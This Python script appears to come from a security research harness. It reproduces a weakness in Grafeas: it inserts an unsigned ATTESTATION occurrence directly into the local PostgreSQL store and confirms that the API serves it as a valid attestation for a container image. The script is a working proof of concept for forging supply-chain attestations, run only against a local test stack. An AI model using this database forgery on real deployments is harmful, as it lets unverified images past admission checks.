#!/usr/bin/env python3
"""L2-33 Grafeas, native APF reproduction (EXPOSED).

Decisive surface (corpus): an ATTESTATION occurrence is trusted as a plain row;
Grafeas does not re-verify the embedded signature. The authorized path is a signed
attestation created by an authorized attester. The APF forge is a state-only write
that inserts an ATTESTATION occurrence directly into Grafeas' PostgreSQL store; the
Grafeas API then serves it as a valid attestation, so a downstream admission check
("is there an attestation for this image?") is satisfied by a forged row.

Steps:
  1. bring up the real Grafeas server (PostgreSQL backend),
  2. create a project + an ATTESTATION note through Grafeas' own HTTP API,
  3. CONTROL: no occurrence attests the target image yet,
  4. FORGE: INSERT an ATTESTATION occurrence row directly in PostgreSQL,
  5. VERIFY: the Grafeas API lists/returns the forged occurrence as a valid
     attestation for the image,
  6. EXPOSED (or INCONCLUSIVE + reason).
"""
import json
import os
import sys
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "..", "lib"))
import common  # noqa: E402

APP_ID = "L2-33"
EV_DIR = os.environ.get("APF_EV_DIR", os.path.join(HERE, "..", "..", "evidence", APP_ID))
API = "http://127.0.0.1:8033/v1"
PROJECT = "projects/apf"
IMAGE = "https://example.com/image@sha256:" + "00" * 32


def http(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(API + path, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.status, json.loads(r.read() or b"{}")


def attestations_for(image):
    # list occurrences and count ATTESTATION kind referencing the image
    _, body = http("GET", "/projects/apf/occurrences")
    occ = body.get("occurrences", []) or []
    return [o for o in occ if o.get("kind") == "ATTESTATION" and o.get("resourceUri") == image]


def main():
    ev = common.Evidence(
        app_id=APP_ID, system="Grafeas", expected_verdict=common.EXPOSED,
        version="grafeas-server:v0.2.3",
        decisive_surface="ATTESTATION occurrence trusted as a plain row (signature not re-verified)")
    out = os.path.join(EV_DIR, "evidence.json")

    with common.guarded(ev, out):
        with common.stack(HERE, ev, up_timeout=600):
            common.wait_tcp("127.0.0.1", 5434, timeout=180, ev=ev)
            common.wait_http(f"{API}/projects", timeout=300, ev=ev)

            # create project (idempotent) + an ATTESTATION note
            http("POST", "/projects", {"name": PROJECT})
            http("POST", "/projects/apf/notes?noteId=prod-attester", {
                "name": "projects/apf/notes/prod-attester",
                "attestation": {"hint": {"humanReadableName": "APF prod attester"}},
            })
            ev.step("seeded note", "projects/apf/notes/prod-attester")

            before = attestations_for(IMAGE)
            ev.step("control", f"attestations for image = {len(before)}")
            if before:
                raise RuntimeError("control precondition failed: image already attested")

            # --- forge: insert an ATTESTATION occurrence directly in PostgreSQL ---
            # Grafeas' postgres schema stores occurrences in the `occurrences` table
            # with a jsonb `data` document; a forged row is served verbatim.
            occ = {
                "name": "projects/apf/occurrences/forged-1",
                "resourceUri": IMAGE,
                "noteName": "projects/apf/notes/prod-attester",
                "kind": "ATTESTATION",
                "attestation": {"serializedPayload": "", "signatures": [
                    {"publicKeyId": "forged", "signature": ""}]},
            }
            conn = common.pg(host="127.0.0.1", port=5434, dbname="grafeas",
                             user="grafeas", password="grafeas")
            # schema-tolerant insert: try the documented (project_id, occurrence_id, data) shape
            try:
                common.sql_exec(conn,
                    "INSERT INTO occurrences (project_id, occurrence_id, data) VALUES (%s,%s,%s)",
                    ("apf", "forged-1", json.dumps(occ)))
            except Exception:
                conn.rollback()
                common.sql_exec(conn,
                    "INSERT INTO occurrences (project_name, occurrence_name, data) VALUES (%s,%s,%s)",
                    ("apf", "forged-1", json.dumps(occ)))
            ev.step("forge", "INSERT ATTESTATION occurrence row (no valid signature)")

            after = attestations_for(IMAGE)
            ev.step("verify", f"attestations for image = {len(after)}")
            if not before and after:
                ev.verdict = common.EXPOSED
                ev.step("verdict", "Grafeas serves the forged, unsigned attestation as "
                                   "valid for the image; signature never re-verified")
            else:
                ev.verdict = common.INCONCLUSIVE
                ev.error = f"attestation not served back (before={len(before)} after={len(after)})"

    print(f"[{APP_ID}] verdict={ev.verdict} -> {out}")


if __name__ == "__main__":
    main()
